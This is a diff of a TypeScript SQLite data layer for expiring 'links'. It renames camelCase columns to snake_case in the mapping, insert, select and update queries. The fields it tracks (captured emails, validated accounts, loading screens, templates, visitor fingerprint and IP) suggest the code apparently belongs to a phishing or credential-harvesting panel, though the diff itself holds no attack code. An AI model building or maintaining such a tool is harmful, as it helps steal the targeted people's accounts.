@@ -82,13 +82,33 @@ function stringifyJSON(value: any): string | null {
 
 // Helper to map DB row to Link object
 function mapRowToLink(row: any): Link {
+  // Map snake_case database columns to camelCase TypeScript interface
   return {
-    ...row,
+    id: row.id,
+    type: row.type,
+    sessionIdentifier: row.session_identifier || row.sessionIdentifier,
+    linkToken: row.link_token || row.linkToken || row.session_identifier || row.sessionIdentifier,
+    name: row.name,
+    createdAt: row.created_at || row.createdAt,
+    expiresAt: row.expires_at || row.expiresAt,
+    status: row.status,
+    templateId: row.template_id || row.templateId,
+    templateMode: row.template_mode || row.templateMode,
+    language: row.language,
+    loadingScreen: row.loading_screen || row.loadingScreen,
+    loadingDuration: row.loading_duration || row.loadingDuration,
+    email: row.email,
     used: Boolean(row.used),
-    allowedEmails: parseJSON(row.allowedEmails),
-    validatedAccounts: parseJSON(row.validatedAccounts),
-    capturedEmails: parseJSON(row.validatedAccounts), // Alias
-    pendingEmails: parseJSON(row.pendingEmails),
+    usedAt: row.used_at || row.usedAt,
+    fingerprint: row.fingerprint,
+    ip: row.ip,
+    allowedEmails: parseJSON(row.allowed_emails || row.allowedEmails),
+    validatedAccounts: parseJSON(row.validated_accounts || row.validatedAccounts),
+    capturedEmails: parseJSON(row.validated_accounts || row.validatedAccounts), // Alias
+    pendingEmails: parseJSON(row.pending_emails || row.pendingEmails),
+    totalEmails: row.total_emails || row.totalEmails,
+    capturedCount: row.captured_count || row.capturedCount,
+    pendingCount: row.pending_count || row.pendingCount,
   }
 }
 
@@ -149,12 +169,13 @@ export async function saveLink(link: Link): Promise<void> {
     link.sessionIdentifier = link.linkToken
   }
 
+  // Use snake_case column names to match database schema
   const stmt = db.prepare(`
     INSERT OR REPLACE INTO links (
-      id, type, sessionIdentifier, linkToken, name, createdAt, expiresAt, status,
-      templateId, templateMode, language, loadingScreen, loadingDuration,
-      email, used, usedAt, fingerprint, ip,
-      allowedEmails, validatedAccounts, pendingEmails, totalEmails, capturedCount, pendingCount
+      id, type, session_identifier, link_token, name, created_at, expires_at, status,
+      template_id, template_mode, language, loading_screen, loading_duration,
+      email, used, used_at, fingerprint, ip,
+      allowed_emails, validated_accounts, pending_emails, total_emails, captured_count, pending_count
     ) VALUES (
       ?, ?, ?, ?, ?, ?, ?, ?,
       ?, ?, ?, ?, ?,
@@ -177,7 +198,8 @@ export async function saveLink(link: Link): Promise<void> {
  */
 export async function getLink(sessionIdentifier: string): Promise<Link | null> {
   const db = getDb()
-  const row = db.prepare('SELECT * FROM links WHERE sessionIdentifier = ? OR linkToken = ?').get(sessionIdentifier, sessionIdentifier)
+  // Use snake_case column names to match database schema
+  const row = db.prepare('SELECT * FROM links WHERE session_identifier = ? OR link_token = ?').get(sessionIdentifier, sessionIdentifier)
 
   if (!row) return null
   return mapRowToLink(row)
@@ -192,10 +214,11 @@ export async function markLinkUsed(
   ip: string
 ): Promise<void> {
   const db = getDb()
+  // Use snake_case column names to match database schema
   db.prepare(`
     UPDATE links 
-    SET used = 1, usedAt = ?, fingerprint = ?, ip = ?, status = 'used'
-    WHERE sessionIdentifier = ? AND type = 'personalized'
+    SET used = 1, used_at = ?, fingerprint = ?, ip = ?, status = 'used'
+    WHERE session_identifier = ? AND type = 'personalized'
   `).run(Date.now(), fingerprint, ip, sessionIdentifier)
 }
 
@@ -225,8 +248,8 @@ export async function updateGenericLinkStats(
   // Update DB
   db.prepare(`
     UPDATE links 
-    SET validatedAccounts = ?, pendingEmails = ?, capturedCount = ?, pendingCount = ?
-    WHERE sessionIdentifier = ?
+    SET validated_accounts = ?, pending_emails = ?, captured_count = ?, pending_count = ?
+    WHERE session_identifier = ?
   `).run(
     stringifyJSON(validatedAccounts),
     stringifyJSON(pendingEmails),
@@ -392,7 +415,8 @@ export async function getEmailIdMapping(id: string): Promise<EmailIdMapping | nu
 export async function cleanupExpiredLinks(): Promise<number> {
   const db = getDb()
   const now = Date.now()
-  const result = db.prepare("UPDATE links SET status = 'expired' WHERE expiresAt < ? AND status = 'active'").run(now)
+  // Use snake_case column name to match database schema
+  const result = db.prepare("UPDATE links SET status = 'expired' WHERE expires_at < ? AND status = 'active'").run(now)
   return result.changes
 }
 
@@ -413,7 +437,8 @@ export async function updateLink(sessionIdentifier: string, updates: Partial<Lin
  */
 export async function deleteLink(sessionIdentifier: string): Promise<boolean> {
   const db = getDb()
-  const result = db.prepare("UPDATE links SET status = 'deleted' WHERE sessionIdentifier = ?").run(sessionIdentifier)
+  // Use snake_case column name to match database schema
+  const result = db.prepare("UPDATE links SET status = 'deleted' WHERE session_identifier = ?").run(sessionIdentifier)
   return result.changes > 0
 }
 
